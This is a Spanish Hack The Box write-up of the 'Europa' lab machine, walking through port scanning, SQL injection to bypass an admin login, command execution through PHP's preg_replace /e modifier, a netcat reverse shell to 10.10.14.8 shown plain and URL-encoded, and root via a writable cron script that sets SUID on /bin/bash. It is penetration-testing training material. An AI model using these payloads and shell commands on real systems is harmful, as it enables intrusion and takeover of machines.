---
title: Hack The Box Europa
author: k4miyo
date: 2021-09-27
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [SQLi, File Misconfiguration]
ping: true
---

## Europa
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.22.

```bash
❯ ping -c 1 10.10.10.22
PING 10.10.10.22 (10.10.10.22) 56(84) bytes of data.
64 bytes from 10.10.10.22: icmp_seq=1 ttl=63 time=142 ms

--- 10.10.10.22 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 142.262/142.262/142.262/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.22 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-27 15:06 CDT
Initiating SYN Stealth Scan at 15:06
Scanning 10.10.10.22 [65535 ports]
Discovered open port 443/tcp on 10.10.10.22
Discovered open port 22/tcp on 10.10.10.22
Discovered open port 80/tcp on 10.10.10.22
Completed SYN Stealth Scan at 15:07, 26.42s elapsed (65535 total ports)
Nmap scan report for 10.10.10.22
Host is up, received user-set (0.14s latency).
Scanned at 2021-09-27 15:06:57 CDT for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.56 seconds
           Raw packets sent: 131085 (5.768MB) | Rcvd: 21 (924B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.22
   5   │     [*] Open ports: 22,80,443
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,80,443 10.10.10.22 -oN target
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-27 15:06 CDT
Nmap scan report for 10.10.10.22
Host is up (0.14s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.40 seconds
```

Dentro del puerto 443, podemos identificar dos dominios:
- europacorp.htb
- admin-portal.europacorp.htb

Por lo que los agregamos al archivo `/etc/hosts` y procedemos ha utilizar la herramienta `whatweb` para observar que tecnologias se utilizando:

```bash
❯ whatweb http://10.10.10.22/
http://10.10.10.22/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
❯ whatweb https://10.10.10.22/
https://10.10.10.22/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
❯ whatweb https://europacorp.htb/
https://europacorp.htb/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
❯ whatweb https://admin-portal.europacorp.htb/
https://admin-portal.europacorp.htb/ [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], RedirectLocation[https://admin-portal.europacorp.htb/login.php]
https://admin-portal.europacorp.htb/login.php [200 OK] Apache[2.4.18], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], JQuery, PasswordField[password], PoweredBy[{], Script[text/javascript], Title[EuropaCorp Server Admin v0.2 beta], X-UA-Compatible[IE=edge]
```

Vemos que para la mayoria, se tiene por título **Apache2 Ubuntu Default Page: It works**; lo que hace referencia a la página default de **Apache**.  Para el dominio `admin-portal.europacorp.htb`, se observa una redirección hacia el recurso `login.php`; por lo que le echamos un ojo para visualizar el contenido.

![](/assets/images/htb-europa/europa_web.png)

De la información reportada por `whatweb`, no se obseva el uso de algún gestor de contenido, por lo que el sitio web podría ser *hecho a mano*. Como podemos observar en la imagen anterior, es necesario contar con una dirección de correo electrónica; pensando un poco vemos que la solicitud se hace a través del puerto 443, por lo que es posible que el certificado del sitio muestre algo de información relevante.

```bash
❯ curl -s --insecure -v https://admin-portal.europacorp.htb/login.php | awk 'BEGIN { cert=0 } /^\* Server certificate:/ { cert=1 
} /^\*/ { if (cert) print }'                                    
*   Trying 10.10.10.22:443...
* Connected to admin-portal.europacorp.htb (10.10.10.22) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1                                       
* successfully set certificate verify locations:
*  CAfile: /etc/ssl/certs/ca-certificates.crt              
*  CApath: /etc/ssl/certs
} [5 bytes data]                                                
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
} [512 bytes data]                                              
* TLSv1.3 (IN), TLS handshake, Server hello (2):
{ [108 bytes data]                                              
* TLSv1.2 (IN), TLS handshake, Certificate (11):
{ [1366 bytes data]  
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):                                                                         
{ [461 bytes data]                                              
* TLSv1.2 (IN), TLS handshake, Server finished (14):
{ [4 bytes data]                                                                                                                 
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):                                                                        
} [70 bytes data]
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
} [1 bytes data]                                                
* TLSv1.2 (OUT), TLS handshake, Finished (20):
} [16 bytes data]
* TLSv1.2 (IN), TLS handshake, Finished (20):
{ [16 bytes data]
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:                                           
*  subject: C=GR; ST=Attica; L=Athens; O=EuropaCorp Ltd.; OU=IT; CN=europacorp.htb; emailAddress=admin@europacorp.htb
*  start date: Apr 19 09:06:22 2017 GMT                   
*  expire date: Apr 17 09:06:22 2027 GMT
*  issuer: C=GR; ST=Attica; L=Athens; O=EuropaCorp Ltd.; OU=IT; CN=europacorp.htb; emailAddress=admin@europacorp.htb
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
} [5 bytes data]       
> GET /login.php HTTP/1.1
> Host: admin-portal.europacorp.htb     
> User-Agent: curl/7.74.0
> Accept: */*
{ [5 bytes data]
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 27 Sep 2021 22:49:08 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Set-Cookie: PHPSESSID=ip078qicvpufnijid1ehr7mc73; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 3968
< Content-Type: text/html; charset=UTF-8
< 
{ [5 bytes data]
* Connection #0 to host admin-portal.europacorp.htb left intact
```

En el resultado obtenido del comando `curl`, vemos una posible dirección de correo electrónico válido: `admin@europacorp.htb`

Podríamos tratar de validar primeramente contraseñas más comunes, como: *admin*, *password*, *admin123*, etc. Vemos que no tenemos éxito, por lo que ahora podríamos tratar inyecciones sql, como agregando el caracter **'** al principio del correo electrónico; es decir, `'admin@europacorp.htb`.

![](/assets/images/htb-europa/europa_sql.png)

Vemos que el sitio web es vulnerable a ataques de tipo SQLi basados en errores. Para facilitar el trabajo, vamos a hacer uso de la herramienta **Burp Suite** en el parte del *Repeater*.

![](/assets/images/htb-europa/europa_burp.png)

Como la información se nos desplega, es decir, lo podemos ver y checar la información; podriamos tratar de obtener datos de la base de datos; primeramente utilizando `' order by x-- -`, en donde `x` representa un dígito asociado al número de columnas de la tabla; por lo tanto podríamos probar con 10 y luego ir disminuyendo hasta que veamos un resultado diferente en la respueta del lado del servidor. (**Nota**: Es importante poner la sentencia sql en formato url encode mediante la selección de dicha sentencia y tecleamos ctrl + u).

Para cuando x toma el valor de 5, vemos que se nos habilita un botón en la parte superior indicando una redirección.

![](/assets/images/htb-europa/europa_burp1.png)

Le damos click al botón **Follow redirection** y de alguna forma extraña ya nos encontramos dentro del panel de administración. Podemos quitar el proxy de **Burp Suite** y checando nuestro explorador, vemos la página de inicio.

![](/assets/images/htb-europa/europa_acceso.png)

Analizando un poco el panel del sitio web, no vemos nada interesante, sólo en la opción *Tools* en donde vemos *OpenVPN Config Generator* y nos solicita ingresar una dirección IP.

![](/assets/images/htb-europa/europa_ip.png)

Si ingresamos una dirección IP o cualquier cadena de texto, vemos que esta se reemplaza dentro de la configuración del valor **"ip_address"**.

![](/assets/images/htb-europa/europa_k4miyo.png)

Podríamos tratar de inyectar comando html o scripts; pero de poco nos va a servir. Vamos a checar como se realizar la solicitud mediante **Burp Suite**.

![](/assets/images/htb-europa/europa_k4miyo1.png)

Vemos en la solicitud se envía `pattern`, `ipaddress` y `text`. Del lado del servidor, podemos ver que donde antes estaba **"ip_address"** ahora vemos nuestro texto. (**Nota**: Para lograr que la solicitud se vea clara, seleccionamos los parámetros que se manda y hacemos ctrl + shift + u).

Como nos podemos dar cuenta, se hace un reemplazo de lo que se encuentra en `pattern` por lo que se encuentra en `ipaddress`. Investigando un poco, vemos que existe un artículo en [bitquark.co.uk](https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace) en donde se expone de los peligros inesperados de preg_replace (). Leyendo un poco, vemos que se tiene un parámetro `e` agregado del lado del `pattern` y un comando a nivel de sistema del lado de `ipaddress`; por lo que podríamos probar.

![](/assets/images/htb-europa/europa_rce.png)

Vemos que tenemos ejecución de comando a nivel de sistema, ahora tenemos que entablarnos una reverse shell para ganar acceso al sistema. Ocupamos nuestro sitio de confianza [pentestmonkey.net](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet); pero hay que recordar que debemos url  encodear el comando que para este caso se utilizó:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f
```

Por lo que al url encodearlo quedaría de la siguiente manera:

```bash
system('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.8+443+>/tmp/f')
```

![](/assets/images/htb-europa/europa_rce1.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.22] 57950
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

Ya tenemos acceso a la máquina como el usuario `www.data`, hacemos un [Tratamiento de la tty](/posts/tratamiento-tty) para trabajar más cómodos y vemos que podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, por lo que enumeramos un poco el sistema.

```bash
www-data@europa:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@europa:/$ sudo -l
[sudo] password for www-data: 
www-data@europa:/$ cd /
www-data@europa:/$ find \-perm 4000 2>/dev/null
www-data@europa:/$
```

No encontramos nada interesante, por lo que es posible que se esté ejecutando una tarea a intervalos regulares de tiempo; así que vamos a utilizar nuestro script [ProcMon](/posts/procmon) para ver que procesos se ejecutan cada cierto tiempo.

```bash
www-data@europa:/dev/shm$ touch procmon.sh; chmod +x procmon.sh
www-data@europa:/dev/shm$ nano procmon.sh 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

www-data@europa:/dev/shm$ cat procmon.sh 
#!/bin/bash

old_process=$(ps -eo command)

while true; do
        new_process=$(ps -eo command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\<\>]" | grep -v -E "command|procmon"
        old_process=$new_process
done
www-data@europa:/dev/shm$
www-data@europa:/dev/shm$ ./procmon.sh 
> /usr/sbin/CRON -f
> /bin/sh -c /var/www/cronjobs/clearlogs
> /usr/bin/php /var/www/cronjobs/clearlogs
< /usr/sbin/CRON -f
< /bin/sh -c /var/www/cronjobs/clearlogs
< /usr/bin/php /var/www/cronjobs/clearlogs
^C
www-data@europa:/dev/shm$ 
```

Analizando un poco los archivos que se están ejecutando, vemos que el usuario **root** ejecuta el archivo `clearlogs` el cual al final ejecuta el archivo `logcleared.sh`; sin embargo, dicho documento no existe y vemos que tenemos permisos `rwx`; asi que podemos crear `logcleared.sh` e indicandole que queremos que quien lo ejecute de le permisos SUID a la `/bin/bash`, en este caso **root**.

```bash
www-data@europa:/dev/shm$ cat /var/www/cronjobs/clearlogs
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
www-data@europa:/dev/shm$ ls -l /var/www/cronjobs/clearlogs
-r-xr-xr-x 1 root root 132 May 12  2017 /var/www/cronjobs/clearlogs
www-data@europa:/dev/shm$ cat /var/www/cmd/logcleared.sh
cat: /var/www/cmd/logcleared.sh: No such file or directory
www-data@europa:/dev/shm$ ls -l /var/www/cmd/logcleared.sh
ls: cannot access '/var/www/cmd/logcleared.sh': No such file or directory
www-data@europa:/dev/shm$ ls -l /var/www/ | grep cmd      
drwxrwxr-x 2 root www-data 4096 May 12  2017 cmd
www-data@europa:/dev/shm$ 
```

```bash
www-data@europa:/dev/shm$ cd /var/www/cmd/
www-data@europa:/var/www/cmd$ touch logcleared.sh; chmod +x logcleared.sh
www-data@europa:/var/www/cmd$ nano logcleared.sh
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

www-data@europa:/var/www/cmd$ cat logcleared.sh 
#!/bin/bash

chmod u+s /bin/bash
www-data@europa:/var/www/cmd$
```

Si esperamos un poco y vemos que ya se tienen los permisos indicados en `/bin/bash`; por lo tanto

```bash
www-data@europa:/var/www/cmd$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
www-data@europa:/var/www/cmd$ bash -p
bash-4.3# whoami
root
bash-4.3#
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).
